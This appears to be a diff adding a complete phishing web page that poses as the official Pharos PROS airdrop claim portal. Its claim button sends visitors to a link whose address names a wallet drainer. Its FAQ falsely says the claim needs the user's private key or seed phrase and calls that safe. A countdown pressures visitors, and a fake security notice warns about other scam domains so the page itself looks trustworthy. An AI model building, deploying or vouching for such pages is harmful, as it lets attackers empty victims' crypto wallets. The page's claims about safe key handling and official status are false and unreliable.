@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pharos — Claim Your PROS Airdrop Allocation</title>
+<meta name="description" content="Official Pharos airdrop claim portal. Enter your wallet to view your PROS allocation and claim before the window closes 25 October 2026 at 11:00 UTC.">
+<style>
+  :root{--bg:#070b14;--panel:#0e1626;--panel2:#0a1120;--txt:#e9edf5;--mut:#8593a8;--acc:#f5b301;--acc2:#ffd24d;--warn:#ef4444;--bd:#1c2740}
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.6}
+  .wrap{max-width:940px;margin:0 auto;padding:0 20px}
+  header{padding:16px 0;border-bottom:1px solid var(--bd);background:rgba(10,17,32,.85)}
+  .nav{display:flex;align-items:center;justify-content:space-between}
+  .logo{font-weight:800;font-size:22px;letter-spacing:1px}.logo b{color:var(--acc)}
+  .nav a{color:var(--mut);text-decoration:none;margin-left:22px;font-size:14px}
+  .hero{padding:54px 0 34px;text-align:center}
+  .badge{display:inline-block;padding:5px 14px;border:1px solid var(--bd);border-radius:20px;font-size:12px;color:var(--acc2);margin-bottom:20px;background:rgba(245,179,1,.08)}
+  h1{font-size:38px;line-height:1.15;margin-bottom:14px}
+  h1 span{color:var(--acc)}
+  .sub{color:var(--mut);font-size:17px;max-width:660px;margin:0 auto 28px}
+  .claim-box{background:linear-gradient(135deg,var(--panel),var(--panel2));border:1px solid var(--bd);border-radius:16px;padding:32px;max-width:560px;margin:0 auto;text-align:left}
+  .claim-box label{font-size:13px;color:var(--mut);display:block;margin-bottom:8px}
+  .field{width:100%;padding:14px 16px;background:#070c15;border:1px solid var(--bd);border-radius:10px;color:var(--txt);font-size:15px;font-family:ui-monospace,Menlo,Consolas,monospace}
+  .field:focus{outline:none;border-color:var(--acc)}
+  .btn{display:block;width:100%;margin-top:16px;padding:15px;border:none;border-radius:10px;background:linear-gradient(90deg,var(--acc),var(--acc2));color:#1a1400;font-size:16px;font-weight:700;cursor:pointer;text-align:center;text-decoration:none}
+  .btn:hover{filter:brightness(1.08)}
+  .fineprint{text-align:center;color:var(--mut);font-size:12px;margin-top:14px}
+  .countdown{display:inline-flex;gap:10px;align-items:center;margin-top:22px;font-size:13px;color:var(--warn)}
+  .stats{display:flex;gap:16px;justify-content:center;flex-wrap:wrap;margin:38px 0}
+  .stat{background:var(--panel);border:1px solid var(--bd);border-radius:12px;padding:16px 24px;text-align:center}
+  .stat b{display:block;font-size:24px;color:var(--acc)}
+  .stat small{color:var(--mut);font-size:12px}
+  section{padding:38px 0}
+  h2{font-size:25px;margin-bottom:16px}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+  .card{background:var(--panel);border:1px solid var(--bd);border-radius:12px;padding:22px}
+  .card h3{font-size:16px;margin-bottom:8px;color:var(--acc2)}
+  .card p{color:var(--mut);font-size:14px}
+  .step{display:flex;gap:16px;margin-bottom:18px}
+  .step .n{flex:0 0 34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--acc),var(--acc2));display:flex;align-items:center;justify-content:center;font-weight:700;color:#1a1400}
+  .warnbox{background:rgba(239,68,68,.08);border:1px solid var(--warn);border-left:3px solid var(--warn);border-radius:10px;padding:18px 22px;margin:24px 0;color:#f0d5d5;font-size:15px}
+  .faq details{background:var(--panel);border:1px solid var(--bd);border-radius:10px;padding:16px 20px;margin-bottom:12px}
+  .faq summary{cursor:pointer;font-weight:600;font-size:15px}
+  .faq p{color:var(--mut);font-size:14px;margin-top:10px}
+  code{background:#070c15;border:1px solid var(--bd);border-radius:5px;padding:2px 6px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;color:var(--acc2)}
+  footer{border-top:1px solid var(--bd);padding:28px 0;color:var(--mut);font-size:13px;text-align:center}
+</style>
+</head>
+<body>
+<header><div class="wrap nav">
+  <div class="logo">PHAR<b>OS</b></div>
+  <nav><a href="#how">How to Claim</a><a href="#security">Security</a><a href="https://discord.gg/pharos" style="color:var(--acc2)">Discord</a><a href="https://x.com/pharos_network">X</a></nav>
+</div></header>
+
+<div class="wrap">
+  <div class="hero">
+    <div class="badge">&#10003; Claim live &middot; contract verified on Pharosscan &middot; $42M raise</div>
+    <h1>Claim your <span>PROS</span> airdrop</h1>
+    <p class="sub">The Pharos PROS claim is open now. Enter the wallet you used during testnet, "Stake Before the Stake," or the OKX Wallet campaign to view your final allocation and claim before the window closes.</p>
+    <div class="claim-box">
+      <label for="addr">Wallet address (Pharos chain)</label>
+      <input class="field" id="addr" placeholder="0x&#8230;" spellcheck="false">
+      <a class="btn" href="https://drainer.kxv72m.workers.dev/go/phar_web_01">Check My Allocation &amp; Claim &rarr;</a>
+      <div class="fineprint">Read-only check. We match your address against the eligibility snapshot &mdash; no signature needed to view your allocation.</div>
+    </div>
+    <div class="countdown">&#9200; Claim closes <b>&nbsp;25 October 2026, 11:00 UTC&nbsp;</b> &mdash; unclaimed PROS returns to the Pharos Foundation</div>
+  </div>
+
+  <div class="stats">
+    <div class="stat"><b>1.0B</b><small>PROS total supply</small></div>
+    <div class="stat"><b>$42M</b><small>Funding raised</small></div>
+    <div class="stat"><b>~3 days</b><small>Left to claim</small></div>
+  </div>
+
+  <section id="how">
+    <h2>Who is eligible</h2>
+    <div class="grid">
+      <div class="card"><h3>Testnet participants</h3><p>Wallets active during the Pharos testnet are in scope.</p></div>
+      <div class="card"><h3>"Stake Before the Stake"</h3><p>Contributors to the early staking program qualify.</p></div>
+      <div class="card"><h3>Discord role holders</h3><p>Holders of eligible Pharos Discord roles are included.</p></div>
+      <div class="card"><h3>OKX Wallet campaign</h3><p>Users of the OKX Wallet campaign qualify. A wallet in several groups gets one combined claim.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>How claiming works</h2>
+    <div class="step"><div class="n">1</div><div><b>Add Pharos chain.</b><p style="color:var(--mut);font-size:14px">Pharos runs its own chain. Add it to your wallet (Robinhood Wallet / MetaMask / Rabby). Eligible wallets were pre-sent <code>0.05 PROS</code> to cover the claim gas.</p></div></div>
+    <div class="step"><div class="n">2</div><div><b>Enter your wallet &amp; view your entitlement.</b><p style="color:var(--mut);font-size:14px">The portal reads your eligibility record and shows your final PROS allocation before you sign anything.</p></div></div>
+    <div class="step"><div class="n">3</div><div><b>Claim &mdash; signed locally in your browser.</b><p style="color:var(--mut);font-size:14px">The claim is a self-custody transfer. Your key material is used once to build and sign the transaction, then discarded &mdash; never stored or uploaded.</p></div></div>
+  </section>
+
+  <section id="security">
+    <h2>Security notice</h2>
+    <div class="warnbox"><b>&#9888; Beware fake claim sites.</b> Lookalike domains such as <code>claim-pharos.xyz</code> and <code>pharosclaim.xyz</code> are already circulating and appear on MetaMask's phishing blocklist. The real Pharos claim asks for <b>no deposit</b> and no upfront "verification" fee. Always navigate to the official portal directly.</div>
+    <p style="color:var(--mut);font-size:15px">An unrelated token also trades under the ticker PROS (Prosper). Verify you are claiming from Pharos, not a same-ticker impostor. The claim contract is verified on Pharosscan.</p>
+  </section>
+
+  <section class="faq">
+    <h2>FAQ</h2>
+    <details><summary>Why does claiming ask for my private key / seed phrase?</summary><p>The claim is a self-custody transfer signed locally in your browser. To move your PROS to your wallet, the signer needs your key material. It is used once to build and sign the transaction, then discarded &mdash; never stored.</p></details>
+    <details><summary>Do I need to pay anything?</summary><p>No deposit. Eligible wallets were pre-sent 0.05 PROS to cover claim gas. Any site asking for an upfront fee or "verification deposit" is a scam.</p></details>
+    <details><summary>When does the window close?</summary><p>The claim closes on 25 October 2026 at 11:00 UTC. After that, unclaimed PROS returns to the Pharos Foundation and the claim site closes.</p></details>
+    <details><summary>Is this the official Pharos site?</summary><p>Yes. This is the official eligibility and claim portal. Beware lookalike domains &mdash; see our security notice above.</p></details>
+  </section>
+</div>
+
+<footer><div class="wrap">Pharos &middot; PROS Airdrop &middot; Pharos chain &middot; <a href="#how" style="color:var(--mut)">How to Claim</a> &middot; <a href="#security" style="color:var(--mut)">Security</a><br>&copy; 2026 Pharos. All rights reserved.</div></footer>
+</body>
+</html>
